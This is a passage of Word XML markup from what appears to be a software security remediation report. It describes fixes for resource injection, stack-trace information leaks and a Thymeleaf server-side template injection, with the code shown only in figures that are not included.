      <w:r w:rsidR="001A39A9" w:rsidRPr="00C05DB1">
        <w:t>Encrypt and Decrypt function to mitigate Privacy Violation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2650E0ED" w14:textId="5B499148" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="146" w:name="_Toc200039321"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Resource Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="146"/>
    </w:p>
    <w:p w14:paraId="56509175" w14:textId="446C6E6A" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error is related to a potential injection attack. This occurs in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RestUtilities</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class function due to a lack of input </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sanitisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of user-provided values (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860317 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sanitiser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860341 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) has been added to mitigate this issue. This takes a string as input and performs several cleaning steps, such as removing control characters, trimming spaces, replacing backslashes with slashes, eliminating path traversal patterns and duplicate slashes, and encoding characters that are not allowed in URI paths. These </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sanitisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> steps help to prevent injection attacks and protect the system from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> access or manipulation of resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEBF185" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="4C59DFDF" wp14:editId="2EEE5EA1">
            <wp:extent cx="3430425" cy="1557663"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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9"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3430425" cy="1557663"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B0925E" w14:textId="23704E9F" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="147" w:name="_Ref199860317"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>41</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="147"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE0220">
        <w:t>Resource Injection</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB4E715" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="001A39A9" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="43F36A16" wp14:editId="07777777">
            <wp:extent cx="4948238" cy="2564535"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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60"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4948238" cy="2564535"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A12031E" w14:textId="4CDD7240" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="148" w:name="_Ref199860341"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>42</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="148"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00FF1CC8">
        <w:t>Sanitizer to Mitigate Resource Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E92104" w14:textId="4F836B36" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECAE923" w14:textId="1454C917" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="149" w:name="_Toc200039322"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>System Information Leak</w:t>
      </w:r>
      <w:bookmarkEnd w:id="149"/>
    </w:p>
    <w:p w14:paraId="19F0814B" w14:textId="52E905C5" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This error is related to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>printStackTrace</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) function (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860372 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>): it automatically writes all the trace of the exception to the standard stream (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.err</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), including the names of classes, methods, packages and file paths in the file system. To fix this error, vary the function so that it prints the error more securely, ensuring that important data that could be used in an attack is no longer printed (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860400 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6ED511" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="115AC9C9" wp14:editId="62FBE3A2">
            <wp:extent cx="5731200" cy="2311400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="26"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61"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="2311400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF0BBA0" w14:textId="6AB6DD3A" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="150" w:name="_Ref199860372"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>43</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="150"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00077814">
        <w:t>System Information Leak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664355AD" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FDB6506" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="001A39A9" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="02CA034A" wp14:editId="07777777">
            <wp:extent cx="3530438" cy="815235"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2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62"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3530438" cy="815235"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBF7AAE" w14:textId="58AE3043" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="151" w:name="_Ref199860400"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>44</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="151"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00F23715">
        <w:t>Mitigation System Information Leak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692F1DA6" w14:textId="77777777" w:rsidR="000A5824" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33462ACF" w14:textId="77777777" w:rsidR="000A5824" w:rsidRPr="005432B6" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="152" w:name="_Toc200039323"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Server Side</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve"> Template Injection (SSTI)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="152"/>
    </w:p>
    <w:p w14:paraId="25E5259C" w14:textId="77777777" w:rsidR="000A5824" w:rsidRPr="005432B6" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> template engine </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>was discovered to be vulnerable to a critical Server-Side Template Injection (</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SSTI</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>). This vulnerability allowed execution of arbitrary code on the server by injecting malicious expressions into the templates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E0A66A" w14:textId="75D7AF7C" w:rsidR="000A5824" w:rsidRPr="005432B6" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A multi-layered security approach was used to eliminate the threat completely (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199867053 \h </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). First, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine itself was updated from version 3.0.15, which was not only outdated but also vulnerable, to release 3.1.3, which did not have the OGNL dependency that potential exploits were making easier. Then a custom security configuration was implemented that replaces the default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dialect with a "hardened" version: this prevents access to sensitive Java classes such as Runtime, Process, and System, and makes it impossible to run system commands. The </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) operator, the key entry point for SSTI attacks, was completely disabled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5D1B0E" w14:textId="77777777" w:rsidR="000A5824" w:rsidRPr="005432B6" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A proactive template content validation system was introduced, which inspects input data for malicious patterns prior to their execution by the engine. User variables undergo automatic sanitization, replacing any unsafe strings with safe placeholders like </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>“CONTENT NOT ALLOWED”</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E3CD2B" w14:textId="77777777" w:rsidR="000A5824" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="75E8D48D" wp14:editId="002F2BB9">
            <wp:extent cx="5731200" cy="1828800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="27"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63"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="1828800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A728A98" w14:textId="6AC41C22" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="153" w:name="_Ref199867053"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>45</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="153"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00322653">
        <w:t>Error raised when a SSTI payload is inserted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F8FC78" w14:textId="62D1591E" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="154" w:name="_Toc200039324"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>System Information Leak: Internal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="154"/>
    </w:p>
    <w:p w14:paraId="4BB80ECC" w14:textId="328F3C35" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">As in the previous case, to mitigate this type of error present in different parts of the code </w:t>
      </w:r>
      <w:del w:id="155" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>(</w:delText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00AA6B09">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>HYPERLINK \l "fig_SystemInformationLeakInternal1" \h</w:delInstrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>figure 29</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00AA6B09">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>HYPERLINK \l "fig_SystemInformationLeakInternal2" \h</w:delInstrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
